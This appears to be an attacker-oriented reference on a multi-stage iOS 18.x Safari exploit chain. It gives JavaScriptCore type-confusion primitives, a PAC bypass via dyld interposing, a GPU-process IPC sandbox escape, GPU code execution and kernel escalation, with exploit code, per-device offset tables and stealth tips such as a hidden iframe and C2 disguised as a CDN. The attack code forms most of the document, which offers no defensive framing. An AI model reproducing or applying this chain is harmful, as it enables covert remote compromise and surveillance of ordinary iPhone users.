# iOS WebKit Exploit Chain Reference

Real-world patterns from Safari RCE + sandbox escape + privilege escalation chains targeting iOS 18.x. Covers JSC exploitation, PAC bypass via dyld interposing, WebKit IPC sandbox escape, and GPU process code execution.

## Chain Architecture

```
Browser Tab (renderer)
  └─ Stage 1: JSC Type Confusion → addrof/fakeobj/read64/write64
  └─ Stage 2: PAC Bypass via dyld interposing → fcall primitive
       └─ Stage 3: Sandbox Escape via GPU Process IPC
            └─ Stage 4: GPU Process Code Exec (unsandboxed)
                 └─ Stage 5: Kernel Exploit (LPE)
```

Processes involved:
- **WebContent** (sandboxed, per-tab) — JSC runs here
- **GPU Process** (less sandboxed, shared) — handles rendering, WebGL
- **Kernel** — final target for full device compromise

---

## Stage 1: JavaScriptCore Type Confusion

### addrof / fakeobj Primitives

The foundation of JSC exploitation. Exploit type confusion between "unboxed" (inline double) and "boxed" (pointer) arrays.

```javascript
// Setup: two arrays with same structure but different storage
const no_cow = 1.1;
const unboxed_arr = [no_cow];  // stores raw IEEE754 doubles
const boxed_arr = [{}];         // stores JSValue-encoded pointers

// After triggering type confusion (structure ID mismatch):
// Reading unboxed_arr[0] returns raw bits of boxed_arr[0]'s pointer
// Writing unboxed_arr[0] with a double → boxed_arr[0] becomes that pointer

function addrof(obj) {
    boxed_arr[0] = obj;
    return BigInt.fromDouble(unboxed_arr[0]);  // leak pointer as double bits
}

function fakeobj(addr) {
    unboxed_arr[0] = addr.asDouble();  // write double bits
    return boxed_arr[0];                // interpret as object pointer
}
```

### Structure ID Spray for Predictable Layout

```javascript
// Spray objects to get predictable adjacent allocations
let scribble_element;
let scribbles = [];
let prev_addr = 0n;
for (let i = 0; i < 500; ++i) {
    let o = { p1: 1.1, p2: 2.2 };
    if (addrof(o) - prev_addr === 0x20n) {
        scribble_element = o;  // found adjacent allocation
        break;
    }
    scribbles.push(o);
    prev_addr = addrof(o);
}
```

### Building read64/write64

```javascript
// Use fakeobj to create a fake object overlapping a real one
// Corrupt the "butterfly" (backing store pointer) of a JSObject
// Then array access through the fake object reads/writes arbitrary memory

// Pattern: create holder object whose inline properties overlap target
let change_scribble_holder = {
    p1: fakeobj(0x108240700000000n),  // fake structure ID
    p2: scribble_element
};
let change_scribble = fakeobj(addrof(change_scribble_holder) + 0x10n);

// read64 via BigUint64Array with corrupted data pointer
let read64_biguint64arr = new BigUint64Array(4);
// ... corrupt its backing store pointer to target address

p.read64 = function(addr) {
    read64_biguint64arr[1] = addr;  // set backing store to target
    // Read through a string whose data pointer was redirected
    return BigInt(read64_str.charCodeAt(0)) |
           BigInt(read64_str.charCodeAt(1)) << 16n |
           BigInt(read64_str.charCodeAt(2)) << 32n |
           BigInt(read64_str.charCodeAt(3)) << 48n;
};
```

### Disable GC (Stabilize Heap)

```javascript
// Critical: prevent garbage collection from moving/freeing corrupted objects
const vm = p.read64(p.read64(p.addrof(globalThis).add(0x10n)).add(0x38n));
const heap = vm.add(0xc0n);
const isSafeToCollect = heap.add(0x241n);
p.write8(isSafeToCollect, 0n);  // GC will never run
```

### Utility: BigInt ↔ Double Conversion

```javascript
const ab = new ArrayBuffer(8);
const f64 = new Float64Array(ab);
const u64 = new BigUint64Array(ab);
const u32 = new Uint32Array(ab);

BigInt.fromDouble = function(v) { f64[0] = v; return u64[0]; };
BigInt.prototype.asDouble = function() { u64[0] = this; return f64[0]; };
BigInt.prototype.noPAC = function() { return this & 0x7fffffffffn; };
```

---

## Stage 2: PAC Bypass via dyld Interposing

### Overview

Instead of brute-forcing PAC or finding a signing oracle in JSC, this technique abuses the dyld runtime's interposing mechanism to get PAC-signed function pointers for arbitrary addresses.

### Step 1: Force Framework Loading via ImageBitmap

```javascript
// Helper workers hold ImageBitmap objects
// Corrupting the bitmap's internal class pointer forces dlopen
// when bitmap.close() is called

const dlopen_worker = `(() => {
  self.onmessage = function(e) {
    const { type, data } = e.data;
    switch (type) {
      case 'init':
        const canvas = new OffscreenCanvas(1, 1);
        globalThis[0] = data;  // marker ID (0x11111111, 0x22222222)
        createImageBitmap(canvas).then(bitmap => {
          globalThis[1] = bitmap;
          self.postMessage(null);
        });
        break;
      case 'dlopen':
        globalThis[1].close();  // triggers dlopen of corrupted path
        break;
    }
  };
})();`;

// Corrupt the bitmap's imageBuffer class pointer to force loading
// TextToSpeech.framework (or other target framework)
const wrappedBitmap = p.read64(worker.bitmap + 0x18n);
const imageBuffer = p.read64(wrappedBitmap + 0x10n);
p.write64(imageBuffer + 0x20n, target_objc_class);
```

### Step 2: Manipulate NSBundle/CFBundle State

```javascript
// Reset the framework's load state so dlopen runs again
p.write64(TextToSpeech_NSBundle + 8n, 0x40008n);  // mark as not loaded
p.write8(TextToSpeech_CFBundle + 0x34n, 0n);       // clear loaded flag
p.write64(AVLoadSpeechSynthesis_onceToken, 0n);    // reset dispatch_once

// Redirect the framework path string via CFNetwork string table
p.write64(CFNetwork_gConstantCFStringValueTable + 0x10n, target_cstring);
p.write64(CFNetwork_gConstantCFStringValueTable + 0x18n, string_length);
```

### Step 3: Inject Interpose Tuples

```javascript
// dyld RuntimeState has interposing tuple buffer
// Inject entries: (replacement_ptr, original_ptr)
// After dlopen, dyld applies interposing → signs replacement pointers

const interposingTuples = new BigUint64Array(0x100 * 2);
function interpose(original_ptr, replacement_ptr) {
    interposingTuples[index++] = replacement_ptr;
    interposingTuples[index++] = original_ptr;
}

// Interpose known functions with target gadgets
// dyld will PACIA-sign the replacement pointers for us
interpose(offsets.MACaptionAppearanceGetDisplayType, offsets.IIOLoadCMPhotoSymbols);
interpose(offsets.CMPhoto_function, offsets.libdyld_dlopen);
interpose(offsets.CMPhoto_function2, offsets.libdyld_dlsym);
interpose(offsets.CMPhoto_function3, offsets.dyld_signPointer);
```

### Step 4: Harvest Signed Pointers

```javascript
// After interposing takes effect, read back the signed pointers
// from the softLink function pointer tables
const paciza_dlopen = p.read64(offsets.ImageIO_gFunc_interposed);
const paciza_dlsym = p.read64(offsets.ImageIO_gFunc_interposed2);
const paciza_signPointer = p.read64(offsets.ImageIO_gFunc_interposed3);

// Now we have PAC-signed dlopen, dlsym, and signPointer
// signPointer is the ultimate primitive: sign any pointer with any context
```

### Step 5: Build fcall Primitive

Two approaches seen in the wild:

**Slow fcall (via document.write triggering softLink):**
```javascript
// Uses WebCore's softLink mechanism as a trampoline
// Main thread calls document.write → triggers phone number detection
// → calls softLinked function → our interposed signed pointer
function slow_fcall(pc, x0, x1, x2) {
    gSecurityd[0x78/8] = pc;        // function to call
    invoker_x0[0x28/8] = x0;       // arguments
    invoker_x0[0x30/8] = x1;
    invoker_x0[0x38/8] = x2;
    // Trigger via postMessage → main thread document.write
    self.postMessage({ type: 'slow_fcall' });
}
```

**Fast fcall (JOP thread with gadget chain):**
```javascript
// Spawn a pthread that loops on a JOP gadget chain
// Control registers via shared memory (BigUint64Array)
// Synchronize via polling magic values

const MAGIC = 123.456;
function fcall(pc, ...args) {
    // Set up stack frame with signed return addresses
    stack_u64[0x80008/8] = pacib_gadget_loop;
    // Signal the JOP thread to execute
    x19_f64[8/8] = MAGIC;
    x20_u64[0x10/8] = paciza_gadget_loop_2;
    x19_u64[0/8] = paciza_gadget_control;
    // Wait for completion (magic value overwritten by gadget)
    while (x19_f64[8/8] === MAGIC);
    // ... set up arguments and PC ...
    return x19_u64[0x20/8];  // return value
}
```

---

## Stage 3: Sandbox Escape via GPU Process IPC

### WebKit IPC (Mach Messages)

WebKit processes communicate via Mach IPC with a custom message encoding format.

```javascript
class Encoder {
    constructor(messageName, destinationID) {
        this.argList = [];
        this.encode('uint8_t', 0);              // flags
        this.encode('uint16_t', messageName);    // message ID
        this.encode('uint64_t', destinationID);  // target object
    }
    encode(type, value) { this.argList.push({type, value}); }
    encode8BitString(str) {
        this.encode('uint32_t', str.length);
        this.encode('bool', true);
        this.argList.push({type: 'bytes', value: str});
    }
    buffer() { /* serialize to ArrayBuffer with alignment */ }
}
```

### Message IDs (per-build)

Message IDs change between WebKit builds. Must be extracted per firmware version:

```javascript
sbx0_offsets = {
    "iPhone12,1_22E240": {
        GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
        GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
        RemoteGraphicsContextGL_BufferData: 0x424,
        RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
        // ... ~30 message IDs per build
    }
};
```

### Exploitation Flow

```
1. Create GPU process connection (WebProcess → GPU)
2. Create RemoteRenderingBackend (get rendering context)
3. Create RemoteGraphicsContextGL (WebGL context in GPU process)
4. Use WebGL operations to read/write GPU process memory:
   - BufferData/BufferSubData: write controlled data
   - GetBufferSubDataInline: read back memory
   - VertexAttrib4f: write floats to specific offsets
5. Build read/write primitive in GPU process address space
6. Achieve code execution in GPU process
```

### Key Offsets for GPU Process Exploitation

```javascript
// GPU process internal structures
GPUProcess_singleton          // global GPU process object
WebProcess_singleton          // WebProcess connection state
RemoteRenderingBackendProxy   // rendering backend proxy object
m_gpuProcessConnection        // connection handle offset
m_remoteGraphicsContextGLMap  // GL context map
m_webProcessConnections       // connection list
```

---

## Stage 4: GPU Process Code Execution

### JSContext Thread Spawning

Once you have fcall in the GPU process, spawn JSContext threads for complex logic:

```javascript
// Create Objective-C JSContext and evaluate JavaScript in it
let jsc_class = objc_getClass("JSContext");
let ctx = objc_alloc_init(jsc_class);

// Set up NSInvocation to call evaluateScript:
let sig = methodSignatureForSelector(ctx, selector_evaluateScript);
let invocation = invocationWithMethodSignature(invoke_class, sig);
setArgument_atIndex(invocation, new_uint64_t(ctx), 0n);
setArgument_atIndex(invocation, new_uint64_t(js_script_nsstring), 2n);

// Spawn on NSThread (runs outside WebContent sandbox)
let nsthread = objc_alloc(nsthread_class);
initWithTarget_selector_object(nsthread, invocation, selector_invoke, 0n);
nsthread_start(nsthread);
```

### GPU Process Primitives

```javascript
// In GPU process context, build new exploit primitives:
let func_resolve = function(symbol) {
    return gpuDlsym(0xFFFFFFFFFFFFFFFEn, symbol);  // RTLD_DEFAULT
};

// Full libc access (unsandboxed):
let MALLOC = func_resolve("malloc");
let OPEN = func_resolve("open");
let WRITE = func_resolve("write");
let MACH_VM_ALLOCATE = func_resolve("mach_vm_allocate");
```

---

## Stage 5: Privilege Escalation Patterns

### IOSurface Kernel Exploit

```javascript
// IOSurface is accessible from GPU process
// Classic technique: create IOSurface, map it, exploit kernel parsing

let IOSURFACECREATE = func_resolve("IOSurfaceCreate");
let IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");

// Create surface with specific properties to trigger kernel bug
let props = CFDictionaryCreateMutable(...);
CFDictionarySetValue(props, kIOSurfaceAllocSize, size_cfnum);
let surface = fcall(IOSURFACECREATE, props);
let base = fcall(IOSURFACEGETBASEADDRESS, surface);
```

### ICMPv6 Socket Info Leak

```javascript
// Classic iOS kernel info leak via ICMPv6 socket options
let sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
// getsockopt with ICMP6_FILTER leaks kernel heap data
getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, leak_buf, len_ptr);
```

---

## Offset Management

### Per-Device Offset Tables

Real exploits use hardcoded offsets per (device_model, build_number):

```javascript
// Key format: "iPhone{model}_{build}"
rce_offsets = {
    "iPhone11,2_4_6_22F76": {
        JavaScriptCore__jitAllowList: 0x1edb3e4a0n,
        WebCore__DedicatedWorkerGlobalScope_vtable: 0x1f137cf70n,
        libdyld__gAPIs: 0x1ed5b8000n,
        // ... 100+ offsets per device
    }
};
```

### Offset Categories

| Category | Examples |
|----------|----------|
| JSC internals | jitAllowList, globalFuncParseFloat, jsc_base |
| WebCore | DedicatedWorkerGlobalScope vtable, allScriptExecutionContextsMap |
| dyld | RuntimeState vtable, gAPIs, dlopen, signPointer |
| Frameworks | AVFAudio classes, TextToSpeech classes, Foundation tables |
| System libs | libsystem_c mutexes, libsystem_kernel functions, pthread |
| Gadgets | control gadgets, loop gadgets, set_all_registers |
| WebKit IPC | message IDs (change per WebKit build) |

### ASLR Handling

```javascript
// Shared cache slide: difference between runtime and static addresses
// On iOS, shared cache is shared across all processes
// If you know one address, you know the slide for everything in shared cache

// Calculate slide from known pointer:
const dyld_offset = offsets.dyld_RuntimeState_emptySlot - dyld_emptySlot - p.slide;

// Apply slide to static offsets:
p.dlopen_from_lambda_ret = offsets.dyld_dlopen_from_lambda_ret - p.slide - dyld_offset;
```

---

## Operational Patterns

### Reliability

- **GC disabled** early to prevent heap corruption
- **Worker threads suspended** after use (prevent crashes)
- **Retry logic** for race-condition-dependent steps
- **Error swallowing** — silent failure + redirect to benign page
- **Version branching** — separate code paths per iOS version

### Stealth

- Hidden iframe (1px, opacity 0.01, off-screen position)
- C2 disguised as CDN (static.cdncounter.net)
- Redirect to 404 page after exploitation
- Logging toggled via SERVER_LOG flag
- fopen() used as log markers (creates files with timing in path)

### Worker Architecture

```
Main thread (rce_loader.js)
  ├── RCE Worker (rce_worker.js) — runs JSC exploit + PAC bypass
  ├── dlopen Worker 1 — holds ImageBitmap, triggers framework load
  ├── dlopen Worker 2 — second framework load for interposing
  └── iframe — triggers document.write for slow_fcall
```

---

## Key Differences from Academic/CTF Exploits

1. **No single-shot** — multi-stage with fallback/retry
2. **No ASLR brute force** — pre-computed offsets per build
3. **PAC bypass is structural** — abuses dyld design, not crypto weakness
4. **Sandbox escape via IPC** — not kernel bug from renderer
5. **GPU process as stepping stone** — less sandboxed than WebContent
6. **Production reliability** — GC disabled, threads suspended, error handling
7. **Maintenance burden** — offset tables must be updated per iOS release
